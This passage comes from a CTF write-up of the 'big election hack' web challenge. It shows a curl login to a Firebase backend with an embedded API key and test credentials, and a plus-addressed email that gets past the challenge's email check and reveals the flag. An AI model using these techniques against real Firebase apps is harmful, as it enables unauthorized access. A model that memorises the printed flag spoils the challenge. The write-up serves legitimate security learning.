    // Signed in 
    // ...
  })
  .catch((error) => {
    var errorCode = error.code;
    var errorMessage = error.message;
  });
```

Or, this can be done by removing the cookies from the web browser and then you reload the web page to set the credentials from the form directly.

This will generate the following curl command:

```
curl 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyDUOa5rtOnbVbF7T7ivUeBBR78L2tkODmY' --data-binary '{"email":"empkuhi.to@yopmail.com","password":"123456","returnSecureToken":true}'
```

Now that we are logged in, we can communicate again with the Cloud Functions API either with the Javascript instructions or the curl command.

<p align="center">
<img src="resources/web-488-the_big_election_hack/31.PNG"/>
</p>

But surprisingly, we got a confusing message:

```
{"result":{"success":false,"message":"I know this is kind of unfair, but you need to use an email address that was created before you started working on this challenge. If you think this is a mistake, PM yakuhito. If you're using a catch-all email address on your domain, choose one particular address from that domain that DOES NOT include 'kuhi.to' (e.g. person@domain.com) and bypass the checks using it."}}
```

And we were stuck here until the end of the CTF because we tried different methods to bypass the mentioned condition (changing the email address, using Google/Twitter/Facebook/Github accounts with the Identity provider that is unfortunately disabled, etc).

When the CTF was over, I asked how to solve the last step and `Lachlan` answered me in the web room from Discord and gave me a good answer

<p align="center">
<img src="resources/web-488-the_big_election_hack/32.PNG"/>
</p>
<p align="center">
<img src="resources/web-488-the_big_election_hack/33.PNG"/>
</p>

So, as I understood, the backend check for the real email address and when we use the email address `youremail+anything@gmail.com`, this will be considered as `youremail@gmail.com` even though the email address includes `anything`. And in this example `anything=kuhi.to`.

So, I get back to Firepwn-tool and I created a new email address `emperor+kuhi.to@yopmail.com`

<p align="center">
<img src="resources/web-488-the_big_election_hack/34.PNG"/>
</p>
<p align="center">
<img src="resources/web-488-the_big_election_hack/35.PNG"/>
</p>

And that worked like a charm.

Then, I validated the email:

<p align="center">
<img src="resources/web-488-the_big_election_hack/36.PNG"/>
</p>

And, when I checked in the mailbox of `emperor@yopmail.com`, I found that we received the email.

<p align="center">
<img src="resources/web-488-the_big_election_hack/37.PNG"/>
</p>

So, I validated the email address:

<p align="center">
<img src="resources/web-488-the_big_election_hack/38.PNG"/>
</p>
<p align="center">
<img src="resources/web-488-the_big_election_hack/39.PNG"/>
</p>

And finally, I logged out and logged in and I requested the Cloud Function API:

<p align="center">
<img src="resources/web-488-the_big_election_hack/40.PNG"/>
</p>

And that's how we got the flag.

So, the flag is: ``X-MAS{oh_no_the_orange_party_has_the_nuclear_button-061b5d6be235263e}``
___










# Scoreboard

In this CTF, we played as a team ``S3c5murf`` with [Likkrid](https://twitter.com/RidhaBejaoui1) and [v3rlust](https://twitter.com/dal0ul) and we got ranked 39th/1064:

<p align="center">
<img src="scoreboard/team.PNG"/>
</p>
<p align="center">
<img src="scoreboard/tasks.PNG"/>
</p>

<p align="center">
<img src="scoreboard/ALL1.PNG"/>
</p>
...
<p align="center">
<img src="scoreboard/ALL2.PNG"/>
</p>
...
<p align="center">
<img src="scoreboard/ALL3.PNG"/>
</p>

<p align="center">
<img src="scoreboard/ALLTN.PNG"/>
</p>

CTFTime event: [https://ctftime.org/event/1209](https://ctftime.org/event/1209)
